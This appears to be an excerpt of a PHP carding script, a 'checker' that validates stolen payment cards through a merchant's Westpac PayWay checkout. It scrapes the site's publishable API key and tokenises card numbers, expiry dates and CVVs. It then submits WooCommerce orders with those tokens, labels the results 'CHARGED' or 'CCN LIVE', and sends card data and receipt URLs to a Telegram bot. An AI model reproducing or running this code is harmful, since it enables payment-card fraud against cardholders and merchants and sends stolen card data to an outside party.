...
curl_close($ch);
// Extract the publishableApiKey using a regular expression
if (preg_match("/publishableApiKey: '([^']+)'/", $Checkout, $matches)) {
    $publishableApiKey = $matches[1];
    "Publishable API Key: " . $publishableApiKey;
}
...
$encodedKey = base64_encode($publishableApiKey . ":");
"Base64 Encoded Key: " . $encodedKey . "\n";
...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'paymentMethod=creditCard&connectionType=FRAME&cardholderName=James&cardNumber='.$cc.'&expiryDateMonth='.$mes_with_zero.'&expiryDateYear='.$ano_no_20.'&cvn='.$cvv.'&threeDS2=false');
$zill = curl_exec($ch);
curl_close($ch);
$kingina = GetStr($zill, '"singleUseTokenId" : "','"');
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'payment_method' => 'westpac_payway_net',
    'westpac-token' => $kingina,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED WESTNET]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    ...
    <span style="color: #d2ff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';

          $telegramMessage = "[#CCN]- $lista [CCN LIVE WESTNET]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
